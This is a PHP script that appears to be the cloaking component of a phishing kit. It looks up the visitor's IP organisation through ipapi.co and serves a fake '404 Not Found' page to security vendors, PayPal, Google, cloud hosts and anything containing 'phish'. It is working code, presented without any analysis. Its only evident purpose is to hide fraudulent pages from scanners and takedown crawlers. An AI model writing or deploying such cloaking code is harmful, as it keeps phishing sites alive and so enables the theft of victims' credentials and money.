<?php 
// @error_reporting(0);

function validate_ip($ip){
    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4 | FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
        return false;
    }
    return true;
}
function get_ip_address() {
    $ip_keys = array('HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR');
    foreach ($ip_keys as $key) {
        if (array_key_exists($key, $_SERVER) === true) {
            foreach (explode(',', $_SERVER[$key]) as $ip) {
                $ip = trim($ip);
                if (validate_ip($ip)) {
                    return $ip;
                }
            }
        }
    }
    return isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : false;
}




$ip = get_ip_address(); 


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://ipapi.co/$ip/org/");
curl_setopt($ch,CURLOPT_USERAGENT,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36");
curl_setopt($ch,CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch,CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch,CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch,CURLOPT_REFERER, 'http://ip-api.com');
$output = curl_exec($ch);
curl_close($ch);


if (strpos($output, 'node32')!== false || strpos($output,'The Rocket Science Group')!== false || strpos($output,'LLC')!== false || strpos($output,'Amazon.com')!== false || strpos($output,'Amazon')!== false || strpos($output,'Chrome')!== false || strpos($output,'Google')!== false || strpos($output,'phish')!== false || strpos($output,'Paypal')!== false || strpos($output,'DedFiberCo')!== false || strpos($output,'Palo Alto Networks')!== false || strpos($output,'Digital Ocean')!== false || strpos($output,'DigitalOcean')!== false || strpos($output,'Google Cloud')!== false || strpos($output,'Cloud')!== false || strpos($output,'107.178.194.44')!== false || strpos($output,'Trustwave Holdings')!== false || strpos($output,'Holdings')!== false || strpos($output,'Trustwave')!== false || strpos($output,'SoftLayer Technologi')!== false || strpos($output,'SoftLayer')!== false || strpos($output,'SurfControl')!== false || strpos($output,'EGIHosting')!== false || strpos($output,'LogicWeb')!== false || strpos($output,'Choopa')!== false || strpos($output,'Shinjiru')!== false || strpos($output,'LogicWeb')!== false || strpos($output,'Inc')!== false || strpos($output,'Total Server Solutions')!== false || strpos($output,'Brookhaven National Laboratory')!== false || strpos($output,'OVH Hosting')!== false || strpos($output,'XFERA Moviles S.A.')!== false || strpos($output,'AVAST Software s.r.o.')!== false || strpos($output,'AVAST')!== false || strpos($output,'Privax Ltd.')!== false || strpos($output,'Privax')!== false || strpos($output,'Ltd')!== false || strpos($output,'M247 Europe SRL')!== false || strpos($output,'Wintek Corporation')!== false || strpos($output,'Sungard Availability Network Solutions')!== false || strpos($output,'Network Solutions')!== false || strpos($output,'McAfee')!== false || strpos($output,'Google Proxy')!== false || strpos($output,'Contina Communications, LLC')!== false || strpos($output,'Limited')!== false || strpos($output,'Venus Business Communications Limited')!== false || strpos($output,'B2 Net Solutions Inc.')!== false || strpos($output,'SunGard Availability Services LP')!== false || strpos($output,'SunGard')!== false || strpos($output,'Fastweb')!== false || strpos($output,'NetStack')!== false || strpos($output,'M247 Ltd')!== false || strpos($output,'UK-2 Limited')!== false || strpos($output,'British Telecommunications PLC')!== false || strpos($output,'Sky UK Limited')!== false || strpos($output,'Integra Telecom, Inc.')!== false || strpos($output,'Hetzner Online GmbH')!== false || strpos($output,'GmbH')!== false || strpos($output,'Top Level Hosting SRL')!== false || strpos($output,'Hosting')!== false || strpos($output,'Digital Energy Technologies Limited')!== false || strpos($output,'Limited')!== false || strpos($output,'Kaspersky Lab AO')!== false || strpos($output,'Kaspersky')!== false || strpos($output,'Datacamp Limited')!== false || strpos($output,'Quintex Alliance Consulting')!== false || strpos($output,'Consulting')!== false || strpos($output,'Transip B.V.')!== false || strpos($output,'Amazon.com, Inc.')!== false || strpos($output,'Forcepoint Cloud Ltd')!== false || strpos($output,'NTT PC Communications, Inc.')!== false || strpos($output,'Liberty Global B.V.')!== false || strpos($output,'vanoppen.biz LLC')!== false || strpos($output,'Amazon.com')!== false || strpos($output,'Cogent Communications')!== false || strpos($output,'Bayer Business Services GmbH')!== false || strpos($output,'GmbH')!== false || strpos($output,'Google LLC')!== false || strpos($output,'Digiweb ltd')!== false || strpos($output,'Eircom')!== false || strpos($output,'GHOSTnet GmbH')!== false || strpos($output,'Voxility S.R.L.')!== false || strpos($output,'OVH SAS')!== false) {




    die("<h1>404 Not Found</h1>The page that you have requested could not be found.");

}


?>